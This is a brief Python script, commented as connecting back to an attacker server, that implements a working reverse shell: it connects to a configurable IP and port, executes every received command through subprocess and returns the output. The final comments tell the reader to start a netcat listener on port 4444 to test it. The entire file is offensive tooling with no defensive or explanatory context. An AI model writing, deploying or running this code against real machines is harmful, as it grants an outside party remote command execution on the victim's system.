#!/usr/bin/env python3
# Connects back to attacker server
import socket
import subprocess
import os

def reverse_shell(server_ip="127.0.0.1", port=4444):
    s = socket.socket()
    s.connect((server_ip, port))

    while True:
        command = s.recv(1024).decode()
        if command.lower() == "exit":
            break
        try:
            output = subprocess.getoutput(command)
            s.send(output.encode())
        except Exception as e:
            s.send(str(e).encode())
    s.close()

if __name__ == "__main__":
    reverse_shell()
# This script creates a reverse shell that connects to a specified server IP and port.
# to test run nc -lvnp 4444 in a terminal